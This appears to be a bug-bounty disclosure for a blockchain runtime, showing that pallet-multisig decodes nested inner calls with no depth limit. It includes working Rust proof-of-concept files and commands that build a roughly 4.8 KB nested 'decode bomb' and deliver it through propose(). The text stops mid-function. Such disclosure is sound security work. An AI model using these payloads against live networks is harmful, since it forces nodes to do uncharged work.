# 89058 bc high pallet multisig decodes an opaque inner call with no depth limit a 4 8 kb nested blob traps the runtime before the weight guard can fire so the work is never charged

## #89058 \[BC-High] pallet-multisig decodes an opaque inner call with no depth limit: a 4.8 KB nested blob traps the runtime before the weight guard can fire, so the work is never charged

**Submitted on Aug 16th 2026 at 21:26:23 UTC by @Naresh\_Kandula for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89058
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters
  * Inaccuracies to the weight (similar to gas) accounting system that under or overcharge by less than 50% of the correct amount (and are not intentional as indicated by the program's terms

### Description

## pallet-multisig decodes an opaque inner call with no depth limit: a 4.8 KB nested blob traps the runtime before the weight guard can fire, so the work is never charged

**Severity:** High\
**Impacts:** *Causing network processing nodes to process transactions from the mempool beyond set parameters* (High) · *Inaccuracies to the weight accounting system that under or overcharge by more than 50% of the correct amount, and are not intentional as indicated by the program's terms* (Medium)\
**Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain> — branch `audit-comp-ready`, HEAD `3b243b8` · Blockchain/DLT\
**Root cause:** `chain/pallets/multisig/src/lib.rs:602` and `chain/pallets/multisig/src/lib.rs:1128`

***

### Summary

`pallet-multisig` carries its inner call as an opaque byte blob and decodes it with a plain, unbounded `Decode`. `RuntimeCall`'s derived `Decode` is recursive and `Utility::batch` re-enters it, so recursion depth is attacker-controlled. The same repository defines `MAX_EXTRINSIC_DEPTH = 256` and applies `decode_all_with_depth_limit` at every *other* decode boundary — but the multisig inner call travels as bytes inside the outer extrinsic, so that limit never sees it.

At \~1,500 levels of nesting — a blob of **4,803 bytes**, well inside the 10,240-byte `MaxCallSize` — the decode **traps** rather than returning `Err`. Because it traps, the pallet's own anti-griefing mitigation (`err_burn_full_raw` on decode failure) never runs, the `MaxInnerCallWeight` gate downstream is never reached, `apply_extrinsic` aborts, and the extrinsic is never included — so **no fee of any kind is ever charged**. Each attempt costs a block-producing node \~2.7 ms of real work and costs the attacker nothing.

### Root cause

```rust
// pallets/multisig/src/lib.rs:597-603  (propose)
// ===== PHASE 3: Decode call (validates call is well-formed for ALL proposals) =====
// NOTE: Decode cost is O(inner_call_count) for nested calls, not O(bytes).
// On decode failure, we burn the full reserved weight to prevent griefing.
let decoded_call = <T as Config>::RuntimeCall::decode(&mut &call[..])
    .map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;
```

```rust
// pallets/multisig/src/lib.rs:1128-1130  (execute)
let call = <T as Config>::RuntimeCall::decode(&mut &proposal.call[..])
    .map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;
```

### The codebase already knows this defence — it is applied everywhere else

This is not a missing feature; it is a missing call:

| location                                | guard                                                  |
| --------------------------------------- | ------------------------------------------------------ |
| `frame/support/src/lib.rs:40`           | `pub const MAX_EXTRINSIC_DEPTH: u32 = 256;`            |
| `frame/executive/src/lib.rs:877`        | `decode_all_with_depth_limit(MAX_EXTRINSIC_DEPTH, ..)` |
| `frame/executive/src/lib.rs:983`        | `decode_all_with_depth_limit(MAX_EXTRINSIC_DEPTH, ..)` |
| `frame/support/src/traits/misc.rs:1043` | `decode_all_with_depth_limit(MAX_EXTRINSIC_DEPTH, ..)` |
| `frame/support/src/traits/misc.rs:1108` | `decode_all_with_depth_limit(MAX_EXTRINSIC_DEPTH, ..)` |
| **`pallets/multisig/src/lib.rs:602`**   | **`RuntimeCall::decode` — none**                       |
| **`pallets/multisig/src/lib.rs:1128`**  | **`RuntimeCall::decode` — none**                       |

The outer extrinsic *is* depth-limited at 256. The executive sees a `Vec<u8>`, not a call tree, so the inner call bypasses it entirely. A repo-wide grep confirms these two are the only unbounded-depth `RuntimeCall` decodes in `pallets/` and `runtime/`:

```
$ grep -rn "RuntimeCall::decode" --include=*.rs pallets/ runtime/ | grep -v test | grep -v mock
pallets/multisig/src/lib.rs:602:   let decoded_call = <T as Config>::RuntimeCall::decode(&mut &call[..])
pallets/multisig/src/lib.rs:1128:  let call = <T as Config>::RuntimeCall::decode(&mut &proposal.call[..])
```

### The guard written to stop exactly this cannot fire

The comment above the decode states the intended mitigation in the developers' own words:

> *"NOTE: Decode cost is O(inner\_call\_count) for nested calls, not O(bytes). On decode failure, we burn the full reserved weight to prevent griefing."*

That mitigation assumes the decode **returns `Err`**. It does not — it traps. Therefore:

* `.map_err(|_| Self::err_burn_full_raw(..))` never runs, so no weight is burned;
* the `MaxInnerCallWeight` check at `lib.rs:605-613` is **downstream of the decode** and is never reached;
* `apply_extrinsic` aborts, the extrinsic is never included, and **no fee is charged**.

Both anti-griefing mechanisms the pallet ships are structurally unreachable in exactly the case they were written for. This is a guard that runs after the thing it guards.

### Reachability

`Utility` is `#[runtime::pallet_index(9)]` (`runtime/src/lib.rs:253-254`) and is **not** disabled — only `Scheduler` at index 8 carries `#[runtime::disable_call]`. This distinction is load-bearing: I verified that `disable_call` *does* remove the variant from the `Decode` impl, which would have made the nested encoding unconstructible. Measured:

```
decode of pallet_index(8) [Scheduler, disable_call] => false
decode of pallet_index(9) [Utility, enabled]        => true
```

`propose` is an ordinary signed extrinsic. Its only precondition is that the caller is a signer of the target multisig:

```rust
// pallets/multisig/src/lib.rs:560-562
if !multisig_data.signers.contains(&proposer) {
    return Self::err_with_weight(Error::<T>::NotASigner, 1);
}
```

An attacker satisfies that by creating their own multisig — measured cost `600000000000` planck (0.6 UNIT), paid **once**. No victim, no privileged role, no cooperation from anyone.

Nesting costs exactly 3 bytes per level (`[pallet_idx=9][call_idx=0][Compact(1)]`), so the production `MaxCallSize = 10240` (`runtime/src/configs/mod.rs:648`) permits **3,412 levels** — 13.3x the `MAX_EXTRINSIC_DEPTH = 256` enforced on every other path.

### Impact

All figures below are measured against the real runtime wasm blob under the production executor configuration.

| depth     | blob        | result in wasm        |
| --------- | ----------- | --------------------- |
| 100       | 303 B       | Ok — decoded, no trap |
| 1,400     | 4,203 B     | Ok — decoded, no trap |
| **1,600** | **4,803 B** | **TRAP**              |
| 3,412     | 10,239 B    | TRAP                  |

```
WASM RESULT: Err(Execution aborted due to trap: wasm trap: out of bounds memory access
```

A blob of at most **4,803 bytes** traps the runtime. The failure boundary lies between 1,400 and 1,600 levels.

**Cost asymmetry, same executor:**

```
call#1 depth=10   ok=true  elapsed=299.91703ms   (cold: includes wasm compilation)
call#2 depth=3412 ok=false elapsed=3.035804ms
call#3 depth=3412 ok=false elapsed=2.735319ms
call#4 depth=3412 ok=false elapsed=2.669615ms
call#5 depth=3412 ok=false elapsed=2.666904ms
call#6 depth=3412 ok=false elapsed=2.711368ms
call#7 depth=10   ok=true  elapsed=63.595µs      <-- executor recovered
```

* **\~2.7 ms** per bomb versus **64-83 µs** for a normal call across runs — conservatively **\~32x**.
* **Zero** charged to the attacker: the extrinsic never lands in a block.
* The trap cost is **depth-independent** — 1,600 levels costs the same as 3,412 — so the cheapest effective bomb is also the smallest. Bytes-per-unit-of-damage is optimal at \~4.8 KB, not 10 KB.

#### Why this is "processing transactions from the mempool beyond set parameters"

The set parameter on this path is the `MaxInnerCallWeight` reservation, added specifically so that decoding a nested call could never exceed budget. It works normally — see the control in section 6 of the output, where a depth-100 blob is correctly rejected with `CallWeightExceedsLimit`. The bomb makes the node do the decode work *outside that parameter entirely*: the weight system observes nothing, charges nothing, and refunds nothing, while the node spends real CPU pulling the transaction from the mempool and attempting it.

The 100% undercharge also maps directly to the Medium line *"Inaccuracies to the weight accounting system that under or overcharge by more than 50% of the correct amount"*, and the "not intentional" qualifier is satisfied by the pallet's own comment, which states the opposite intent.

#### What I did not prove, stated plainly

* **No chain split, and this must not be read as Critical.** The trap is the runtime blob's own linear-memory shadow stack, not a host setting: the trap text is *"out of bounds memory access"*, not "call stack exhausted", and `__stack_pointer` is initialised to `1048576` inside the consensus wasm itself. Every node traps at the same depth. There is no divergence.
* **No node crash and no poisoned state.** The executor recovers cleanly (call #7 above). A block author drops the offending transaction and continues; the block is still produced. An attacker who mines a block containing the extrinsic simply produces a block honest nodes reject.
* **Not a 500%-block-delay.** The proposer is deadline-bounded at 10 s (`node/src/service.rs:498`) against a 12 s target block time (`runtime/src/lib.rs:90`), so a single block cannot be delayed by the 60 s that line requires.
* **I did not run a live multi-node flood.** Sustained pressure is bounded by the attacker's account count, because `propose` is signed and a transaction that is never included never advances its nonce, so each account contributes a limited number of *ready* bombs at a time; and each distinct bomb costs a given node one trap before being banned from its pool.

The honest claim is therefore: **an unprivileged attacker, after a one-time 0.6 UNIT setup, can repeatedly make block-producing nodes perform \~2.7 ms of uncharged work each, entirely outside the weight accounting system written to prevent it.**

#### Severity reasoning, including the case against

I have asked for High on *"causing network processing nodes to process transactions from the mempool beyond set parameters"*, because the defining feature is that the work happens outside the set parameter rather than merely exceeding it.

A reviewer may reasonably prefer **Medium**, on *"inaccuracies to the weight accounting system that under or overcharge by more than 50%"* — the undercharge is 100%. I think that mapping is also correct and would not dispute a Medium determination. What I ask is that the decision be made on the mapping rather than on an assumption that this is generic mempool spam: generic spam pays fees and is weight-accounted, and this is precisely the case that is neither.

### Novelty: why this is not covered by the published audits

Equilibrium's 2026-05-13 review covered `pallet-multisig` (19 findings). I read the three nearest in full.

**EQ-QNT-MULTISIG-F-01 (High) — "Dispatched RuntimeCall execution is not charged in the multisig fee model."** The closest, and it explicitly reasons about `utility::batch` carrying many inner calls. The fix that shipped is the `MaxInnerCallWeight` reservation now at `lib.rs:605-613`. A reviewer could ask whether this report is a residual of F-01. It is not, and the difference is directly measurable — section 6 of the output versus section 2:

* At **depth 100** the decode *completes*, the F-01 weight gate fires, the transaction is included and the reserved weight is burned. The mitigation does exactly what it was built to do.
* At **depth >=1,600** the runtime traps at `lib.rs:602`, *before* the gate at `lib.rs:605` is ever reached, and nothing is charged.

F-01 hardened the path where decode returns. This report is the path where decode does not return. F-01's fix cannot address it, because it lives downstream of the failure.

**EQ-QNT-MULTISIG-O-01 — "High-security validation and call decoding are deferred later than necessary."** Quotes the exact unlimited decode line, but its entire thesis is *ordering* — that the high-security check happens before cheaper proposal-count and expiry checks — and its recommendation is to "validate and decode the call earlier in a consistent place". It does not mention depth, recursion, or stack exhaustion, and moving the decode earlier would not change this outcome.

**EQ-QNT-MULTISIG-O-03 — "The extrinsic call boundary is looser than the pallet's own limits require."** Notes the `call: Vec<u8>` parameter but explicitly calls it *"a design-quality issue rather than a direct bug"* and recommends a bounded input type. **That fix has already shipped** — at HEAD the parameter is `call: BoundedCallOf<T> = BoundedVec<u8, MaxCallSize>` (`lib.rs:538`, alias at `lib.rs:254`) — and the bomb passes straight through it, because a *size* bound does not constrain *depth*: 4,803 bytes is comfortably inside the 10,240-byte limit.

I also grepped every published report in scope for `depth limit`, `decode_all_with_depth`, `nesting depth`, `recursion depth`, `stack exhaust` and `decode bomb`: no hits. And no existing test asserts this behaviour as intended — `grep -niE "nested|depth|recursi|stack"` over `pallets/multisig/src/tests.rs` and `pallets/utility/src/tests.rs` returns nothing relevant.

### Proof of Concept

#### Steps to reproduce

Self-contained. Requires only a clone of the in-scope repository and a Rust toolchain; no external crates and no network beyond `cargo fetch`.

{% stepper %}
{% step %}

### Clone the repository

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain
cd audit-comp-quantus-chain
git checkout audit-comp-ready     # HEAD 3b243b8
```

{% endstep %}

{% step %}

### Save PoC file A

Save PoC file A below as `pallets/multisig/src/depth_poc.rs`.
{% endstep %}

{% step %}

### Save PoC file B

Save PoC file B below as `runtime/src/depth_poc.rs`.
{% endstep %}

{% step %}

### Apply the wiring edits

```diff
--- a/pallets/multisig/src/lib.rs
+++ b/pallets/multisig/src/lib.rs
@@ -42,6 +42,9 @@ mod mock;
 #[cfg(test)]
 mod tests;

+#[cfg(test)]
+mod depth_poc;
+
 pub mod weights;
```

```diff
--- a/runtime/src/lib.rs
+++ b/runtime/src/lib.rs
@@ -9,6 +9,9 @@ pub mod apis;
 mod benchmarks;
 pub mod configs;

+#[cfg(test)]
+mod depth_poc;
+
 pub use qp_dilithium_crypto::{
```

```diff
--- a/runtime/Cargo.toml
+++ b/runtime/Cargo.toml
@@ -74,6 +74,7 @@ substrate-wasm-builder = { optional = true, workspace = true, default-features =

 [dev-dependencies]
 env_logger.workspace = true
+sc-executor = { workspace = true, features = ["std"] }
 qp-dilithium-crypto.workspace = true
 qp-poseidon-core.workspace = true
 sp-io.workspace = true
```

{% endstep %}

{% step %}

### Run the PoC

Save the runner below as `run_depth_poc.sh` in the repository root, then:

```bash
chmod +x run_depth_poc.sh
./run_depth_poc.sh
```

Do **not** set `SKIP_WASM_BUILD`: sections 2 and 5 execute the real runtime wasm blob and require it to be built. Expect a long first build. Everything runs `--release`; the timings in section 5 are only meaningful in release, because unoptimised recursive decode is far slower and would overstate the asymmetry.

A native stack overflow aborts the process by design (`SIGABRT`), so sections 3 and 4 print the overflow message and stop. That is the expected observation, not a harness failure. The authoritative measurement is section 2, which runs in wasm.
{% endstep %}
{% endstepper %}

#### Individual invocations

```bash
# byte cost per nesting level and the depth MaxCallSize permits
cargo test --release -p quantus-runtime --lib depth_poc::poc_budget_under_production_max_call_size -- --nocapture

# does disable_call remove the variant from the codec?
cargo test --release -p quantus-runtime --lib depth_poc::poc_is_disabled_pallet_still_decodable -- --nocapture

# in-wasm trap boundary (vary the depth)
POC_DEPTH=1400 cargo test --release -p quantus-runtime --lib depth_poc::wasm_probe -- --nocapture --test-threads=1
POC_DEPTH=1600 cargo test --release -p quantus-runtime --lib depth_poc::wasm_probe -- --nocapture --test-threads=1

# cost per trap + executor recovery
cargo test --release -p quantus-runtime --lib depth_poc::wasm_probe::poc_wasm_executor_recovers -- --nocapture --test-threads=1

# end-to-end through the real propose() at production config
POC_DEPTH=3412 POC_STACK=1048576 cargo test --release -p quantus-runtime --lib depth_poc::e2e -- --nocapture --test-threads=1

# CONTROL: shallow depth, decode completes, weight gate fires
POC_DEPTH=100 POC_STACK=1048576 cargo test --release -p pallet-multisig --lib depth_poc::poc_propose_reaches_the_unbounded_decode -- --nocapture --test-threads=1
```

### PoC file A: `pallets/multisig/src/depth_poc.rs`

```rust
//! PoC: unbounded recursion depth in `pallet-multisig`'s opaque inner-call decode.
//!
//! `propose` / `execute` call `<T as Config>::RuntimeCall::decode(..)` directly
//! (lib.rs:602 and lib.rs:1128) instead of
//! `decode_all_with_depth_limit(MAX_EXTRINSIC_DEPTH, ..)` which `frame-executive`
//! uses for the *outer* extrinsic (frame/executive/src/lib.rs:877,983).
//!
//! Because the inner call travels as opaque bytes inside the outer extrinsic, the
//! outer depth limit of 256 never sees it.
//!
//! Run with:
//!   POC_DEPTH=<n> POC_STACK=<bytes> cargo test -p pallet-multisig --lib \
//!     depth_poc -- --nocapture --test-threads=1

use crate::mock::*;
use codec::{Compact, Decode, Encode};

/// Pallet index of `Utility` in the *mock* runtime (see mock.rs `pallet_index(6)`).
const MOCK_UTILITY_INDEX: u8 = 6;
/// `pallet_utility::Call::batch` is `call_index(0)` (pallets/utility/src/lib.rs:202).
const BATCH_CALL_INDEX: u8 = 0;

/// Hand-encode `Utility::batch { calls: vec![ Utility::batch { calls: vec![ ... ] } ] }`
/// nested `depth` times, with a cheap `System::remark` at the bottom.
///
/// Each nesting level costs exactly 3 bytes:
///   [pallet_index][call_index][Compact(1) = number of inner calls]
pub fn nested_batch_bytes(depth: u32) -> Vec<u8> {
        let innermost: RuntimeCall =
                RuntimeCall::System(frame_system::Call::remark { remark: Vec::new() });
        let mut buf = innermost.encode();

        let mut level = Vec::with_capacity(3 + buf.len());
        for _ in 0..depth {
                level.clear();
                level.push(MOCK_UTILITY_INDEX);
                level.push(BATCH_CALL_INDEX);
                Compact(1u32).encode_to(&mut level);
                level.extend_from_slice(&buf);
                core::mem::swap(&mut buf, &mut level);
        }
        buf
}

/// Free the decoded value without recursing on `Drop` (a deeply nested value would
/// otherwise blow the stack again while being dropped, confusing the measurement).
fn leak(call: RuntimeCall) {
        core::mem::forget(call);
}

#[test]
fn poc_bytes_per_level_is_three() {
        let a = nested_batch_bytes(10);
        let b = nested_batch_bytes(20);
        println!("depth=10 -> {} bytes, depth=20 -> {} bytes", a.len(), b.len());
        assert_eq!(b.len() - a.len(), 30, "3 bytes per nesting level");
}

/// The measurement harness. `POC_DEPTH` nesting levels are decoded on a thread with
/// a `POC_STACK`-byte stack. Prints the outcome; if the stack is exhausted the
/// process aborts and the harness prints nothing after "decoding...".
#[test]
fn poc_decode_depth() {
        let depth: u32 = std::env::var("POC_DEPTH").ok().and_then(|v| v.parse().ok()).unwrap_or(200);
        // Default 1 MiB == wasmtime `max_wasm_stack` used by this repo's executor
        // (client/executor-wasmtime/src/runtime.rs:239-249, `deterministic_stack_limit: None`).
        let stack: usize =
                std::env::var("POC_STACK").ok().and_then(|v| v.parse().ok()).unwrap_or(1024 * 1024);

        let blob = nested_batch_bytes(depth);
        println!("POC depth={} stack={} blob_bytes={}", depth, stack, blob.len());
        println!("decoding...");

        let h = std::thread::Builder::new()
                .stack_size(stack)
                .spawn(move || {
                        let res = <RuntimeCall as Decode>::decode(&mut &blob[..]);
                        match res {
                                Ok(c) => {
                                        println!("RESULT: Ok(decoded)");
                                        leak(c);
                                        true
                                },
                                Err(e) => {
                                        println!("RESULT: Err({:?})", e);
                                        false
                                },
                        }
                })
                .unwrap();

        let joined = h.join();
        println!("JOIN: {:?}", joined.is_ok());
}

/// End-to-end reachability: the bomb is delivered through the real `propose`
/// extrinsic, from an ordinary signed origin, on a multisig the attacker created.
#[test]
fn poc_propose_reaches_the_unbounded_decode() {
        let depth: u32 = std::env::var("POC_DEPTH").ok().and_then(|v| v.parse().ok()).unwrap_or(100);
        let stack: usize =
                std::env::var("POC_STACK").ok().and_then(|v| v.parse().ok()).unwrap_or(1024 * 1024);

        let blob = nested_batch_bytes(depth);
        println!("POC(propose) depth={} stack={} blob_bytes={}", depth, stack, blob.len());
        assert!(
                blob.len() <= MaxCallSizeParam::get() as usize,
                "blob {} exceeds mock MaxCallSize {}",
                blob.len(),
                MaxCallSizeParam::get()
        );

        let h = std::thread::Builder::new()
                .stack_size(stack)
                .spawn(move || {
                        new_test_ext().execute_with(|| {
                                System::set_block_number(1);
                                let attacker = account_id(5);
                                let sock = account_id(4);
                                let signers = vec![attacker.clone(), sock.clone()];

                                // Attacker creates their OWN multisig - no victim cooperation needed.
                                Multisig::create_multisig(
                                        RuntimeOrigin::signed(attacker.clone()),
                                        signers.clone(),
                                        2,
                                        0,
                                )
                                .expect("create_multisig");

                                let ms = Multisig::derive_multisig_address(&signers, 2, 0);

                                println!("submitting propose() with the nested blob...");
                                let r = Multisig::propose(
                                        RuntimeOrigin::signed(attacker.clone()),
                                        ms,
                                        blob.try_into().unwrap(),
                                        100u64,
                                );
                                println!("PROPOSE RESULT: {:?}", r);
                        });
                })
                .unwrap();

        println!("JOIN: {:?}", h.join().is_ok());
}
```

### PoC file B: `runtime/src/depth_poc.rs`

```rust
//! PoC (real runtime): unbounded recursion depth in `pallet-multisig`'s opaque
//! inner-call decode, measured against the *production* `RuntimeCall` enum and the
//! *production* `MaxCallSize = 10240` bound.
//!
//! Vulnerable sites (no depth limit):
//!   pallets/multisig/src/lib.rs:602   <T as Config>::RuntimeCall::decode(&mut &call[..])
//!   pallets/multisig/src/lib.rs:1128  <T as Config>::RuntimeCall::decode(&mut &proposal.call[..])
//!
//! The defence the codebase applies everywhere else:
//!   frame/support/src/lib.rs:40        MAX_EXTRINSIC_DEPTH = 256
//!   frame/executive/src/lib.rs:877,983 decode_all_with_depth_limit(MAX_EXTRINSIC_DEPTH, ..)
//!
//! Run:
//!   POC_DEPTH=<n> POC_STACK=<bytes> cargo test -p quantus-runtime --lib \
//!     depth_poc -- --nocapture --test-threads=1

use crate::{configs::MaxCallSize, RuntimeCall};
use codec::{Compact, Decode, Encode};
#[allow(unused_imports)]
use frame_support::traits::Get;

/// `Utility` is `#[runtime::pallet_index(9)]` in runtime/src/lib.rs and is **not**
/// `#[runtime::disable_call]`d (only `Scheduler` at index 8 is).
const UTILITY_INDEX: u8 = 9;
/// `pallet_utility::Call::batch` == `call_index(0)`.
const BATCH_CALL_INDEX: u8 = 0;
/// `Scheduler` is `pallet_index(8)` and carries `#[runtime::disable_call]`.
const SCHEDULER_INDEX: u8 = 8;

/// Hand-encode `Utility::batch { calls: vec![ .. ] }` nested `depth` times.
/// Cost is exactly 3 bytes per level: [pallet_idx][call_idx][Compact(1)].
pub fn nested_batch_bytes(depth: u32) -> Vec<u8> {
        let innermost: RuntimeCall =
                RuntimeCall::System(frame_system::Call::remark { remark: Vec::new() });
        let mut buf = innermost.encode();
        let mut level = Vec::new();
        for _ in 0..depth {
                level.clear();
                level.push(UTILITY_INDEX);
                level.push(BATCH_CALL_INDEX);
                Compact(1u32).encode_to(&mut level);
                level.extend_from_slice(&buf);
                core::mem::swap(&mut buf, &mut level);
        }
        buf
}

/// Confirm the byte cost per nesting level and how deep `MaxCallSize` lets us go.
#[test]
fn poc_budget_under_production_max_call_size() {
        let max = MaxCallSize::get() as usize;
        let a = nested_batch_bytes(10).len();
        let b = nested_batch_bytes(20).len();
        let per_level = (b - a) / 10;
        let max_depth = (max - nested_batch_bytes(0).len()) / per_level;
        println!("production MaxCallSize        = {} bytes", max);
        println!("bytes per nesting level      = {}", per_level);
        println!("max nesting depth in budget  = {}", max_depth);
        println!("blob at that depth           = {} bytes", nested_batch_bytes(max_depth as u32).len());
        println!("frame_support::MAX_EXTRINSIC_DEPTH = {}", frame_support::MAX_EXTRINSIC_DEPTH);
        assert_eq!(per_level, 3);
}

/// Does `#[runtime::disable_call]` remove the variant from the `Decode` impl,
/// or only filter at dispatch? Decoding is what overflows, so this matters.
#[test]
fn poc_is_disabled_pallet_still_decodable() {
        // pallet_scheduler::Call::cancel { when, index } - smallest well-formed shape.
        // If `disable_call` removed the variant from RuntimeCall, decode must fail.
        let mut bytes = vec![SCHEDULER_INDEX, 1u8];
        bytes.extend_from_slice(&0u32.encode());
        bytes.extend_from_slice(&0u32.encode());
        let r = <RuntimeCall as Decode>::decode(&mut &bytes[..]);
        println!("decode of pallet_index(8) [Scheduler, disable_call] => {:?}", r.is_ok());

        // Control: Utility (index 9) is enabled - decode must succeed.
        let ok = <RuntimeCall as Decode>::decode(&mut &nested_batch_bytes(1)[..]);
        println!("decode of pallet_index(9) [Utility, enabled]        => {:?}", ok.is_ok());
        assert!(ok.is_ok(), "Utility::batch must be decodable");
}

fn leak(c: RuntimeCall) {
        core::mem::forget(c);
}

/// The measurement. Decode `POC_DEPTH` levels on a thread with a `POC_STACK`-byte
/// stack. 1 MiB is this repo's effective wasm stack ceiling
/// (client/executor-wasmtime/src/runtime.rs:239-249 -> `config.max_wasm_stack(1 MiB)`
/// because `deterministic_stack_limit` is `None`).
#[test]
fn poc_decode_depth() {
        let depth: u32 = std::env::var("POC_DEPTH").ok().and_then(|v| v.parse().ok()).unwrap_or(100);
        let stack: usize =
                std::env::var("POC_STACK").ok().and_then(|v| v.parse().ok()).unwrap_or(1024 * 1024);

        let blob = nested_batch_bytes(depth);
        assert!(
                blob.len() <= MaxCallSize::get() as usize,
                "blob {} exceeds production MaxCallSize {}",
                blob.len(),
                MaxCallSize::get()
        );
        println!("POC depth={} stack={} blob_bytes={}", depth, stack, blob.len());
        println!("decoding real RuntimeCall...");

        let h = std::thread::Builder::new()
                .stack_size(stack)
                .spawn(move || match <RuntimeCall as Decode>::decode(&mut &blob[..]) {
                        Ok(c) => {
                                println!("RESULT: Ok(decoded)");
                                leak(c);
                        },
                        Err(e) => println!("RESULT: Err({:?})", e),
                })
                .unwrap();
        println!("JOIN: {:?}", h.join().is_ok());
}

// ===========================================================================
// WASM measurement: run the REAL runtime blob inside the REAL executor config.
// ===========================================================================
//
// The node builds its executor with `sc_service::new_wasm_executor`
// (node/src/service.rs:599) -> `sc_executor::WasmExecutor`, whose
// `Semantics.deterministic_stack_limit` is hard-coded `None`
// (sc-executor-0.47.0/src/wasm_runtime.rs:314), which makes
// client/executor-wasmtime/src/runtime.rs:239-249 pick
// `config.max_wasm_stack(1 MiB)`.
//
// The runtime blob's own shadow stack is also 1 MiB and is laid out *first*
// (measured with wasm-objdump on target/debug/wbuild/quantus-runtime/quantus_runtime.wasm:
//   global[0] i32 mutable <__stack_pointer> init i32=1048576
//   global[1] i32          <__data_end>      init i32=1444512 ).
//
// This test drives a runtime API that takes a `RuntimeCall` argument, because
// sp-api decodes runtime-API arguments with a plain `Decode::decode`
// (sp-api-proc-macro-26.0.0/src/impl_runtime_apis.rs:103) - the same
// unbounded-depth decode `pallet-multisig` performs on the opaque blob. It is
// therefore a faithful in-wasm probe of what the multisig decode does.
#[cfg(test)]
mod wasm_probe {
        use super::nested_batch_bytes;
        use codec::Encode;
        use sp_core::traits::{CallContext, CodeExecutor, RuntimeCode, WrappedRuntimeCode};

        #[test]
        fn poc_wasm_decode_depth() {
                let depth: u32 =
                        std::env::var("POC_DEPTH").ok().and_then(|v| v.parse().ok()).unwrap_or(100);

                let code = crate::WASM_BINARY.expect("runtime wasm must be built (do not set SKIP_WASM_BUILD)");
                let runtime_code = RuntimeCode {
                        code_fetcher: &WrappedRuntimeCode(code.into()),
                        hash: vec![1, 2, 3, 4],
                        heap_pages: None,
                };

                let executor =
                        sc_executor::WasmExecutor::<sp_io::SubstrateHostFunctions>::builder().build();

                let mut ext = sp_io::TestExternalities::default();
                let mut ext = ext.ext();

                // Argument tuple for `TransactionPaymentCallApi_query_call_info(call, len)`
                // (runtime/src/apis.rs:237). `call` is the nested Utility::batch bomb.
                let mut args = nested_batch_bytes(depth);
                args.extend_from_slice(&0u32.encode());

                println!("WASM POC depth={} call_bytes={}", depth, args.len() - 4);
                let (res, _) = executor.call(
                        &mut ext,
                        &runtime_code,
                        "TransactionPaymentCallApi_query_call_info",
                        &args,
                        CallContext::Offchain,
                );
                match res {
                        Ok(_) => println!("WASM RESULT: Ok (decoded inside wasm, no trap)"),
                        Err(e) => println!("WASM RESULT: Err({})", e),
                }
        }

        /// Does a trap poison the executor / the cached runtime instance for the next
        /// call? (Answers "is the block-building state poisoned or the instance killed".)
        #[test]
        fn poc_wasm_executor_recovers_after_trap() {
                let code = crate::WASM_BINARY.expect("runtime wasm must be built");
                let runtime_code = RuntimeCode {
                        code_fetcher: &WrappedRuntimeCode(code.into()),
                        hash: vec![1, 2, 3, 4],
                        heap_pages: None,
                };
                let executor =
                        sc_executor::WasmExecutor::<sp_io::SubstrateHostFunctions>::builder().build();

                let run = |depth: u32| {
                        let mut ext = sp_io::TestExternalities::default();
                        let mut ext = ext.ext();
                        let mut args = nested_batch_bytes(depth);
                        args.extend_from_slice(&0u32.encode());
                        let t = std::time::Instant::now();
                        let (res, _) = executor.call(
                                &mut ext,
                                &runtime_code,
                                "TransactionPaymentCallApi_query_call_info",
                                &args,
                                CallContext::Offchain,
                        );
                        (res.is_ok(), t.elapsed())
                };

                let bomb: u32 = std::env::var("POC_DEPTH").ok().and_then(|v| v.parse().ok()).unwrap_or(3412);
                let (ok0, d0) = run(10);
                println!("call#1 depth=10   ok={} elapsed={:?}", ok0, d0);
                for i in 0..5 {
                        let (ok, d) = run(bomb);
                        println!("call#{} depth={} bytes={} ok={} elapsed={:?}", i + 2, bomb, nested_batch_bytes(bomb).len(), ok, d);
                }
                let (ok_after, d_after) = run(10);
                println!("call#7 depth=10   ok={} elapsed={:?}  <-- executor recovered?", ok_after, d_after);
                assert!(ok0);
        }
}

// ===========================================================================
// End-to-end reachability at PRODUCTION config: attacker -> propose() -> decode
// ===========================================================================
#[cfg(test)]
mod e2e {
        use super::nested_batch_bytes;
        use crate::{
                configs::MaxCallSize, AccountId, Balances, Multisig, Runtime, RuntimeOrigin, System,
                EXISTENTIAL_DEPOSIT,
        };
        #[allow(unused_imports)]
        use frame_support::traits::Get;
        use sp_runtime::{AccountId32, BuildStorage};

        fn acct(n: u8) -> AccountId {
                AccountId32::from([n; 32])
        }

        fn ext() -> sp_io::TestExternalities {
                let mut t = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
                pallet_balances::GenesisConfig::<Runtime> {
                        balances: vec![
                                (acct(1), EXISTENTIAL_DEPOSIT * 1_000_000),
                                (acct(2), EXISTENTIAL_DEPOSIT * 1_000_000),
                        ],
                        dev_accounts: None,
                }
                .assimilate_storage(&mut t)
                .unwrap();
                pallet_reversible_transfers::GenesisConfig::<Runtime> {
                        initial_high_security_accounts: vec![],
                }
                .assimilate_storage(&mut t)
                .unwrap();
                sp_io::TestExternalities::new(t)
        }

        /// Deliver the maximum-depth blob the production `MaxCallSize` allows through
        /// the real `propose` extrinsic, on a thread whose stack equals the production
        /// wasm stack (1 MiB).
        #[test]
        fn poc_e2e_propose_production_config() {
                let depth: u32 =
                        std::env::var("POC_DEPTH").ok().and_then(|v| v.parse().ok()).unwrap_or(3412);
                let stack: usize =
                        std::env::var("POC_STACK").ok().and_then(|v| v.parse().ok()).unwrap_or(1024 * 1024);

                let blob = nested_batch_bytes(depth);
                println!(
                        "E2E depth={} stack={} blob_bytes={} (MaxCallSize={})",
                        depth,
                        stack,
                        blob.len(),
                        MaxCallSize::get()
                );

                let h = std::thread::Builder::new()
                        .stack_size(stack)
                        .spawn(move || {
                                ext().execute_with(|| {
                                        System::set_block_number(1);
                                        let attacker = acct(1);
                                        let sock = acct(2);
                                        let signers = vec![attacker.clone(), sock.clone()];

                                        let bal_before = Balances::free_balance(&attacker);
                                        Multisig::create_multisig(
                                                RuntimeOrigin::signed(attacker.clone()),
                                                signers.clone(),
                                                2,
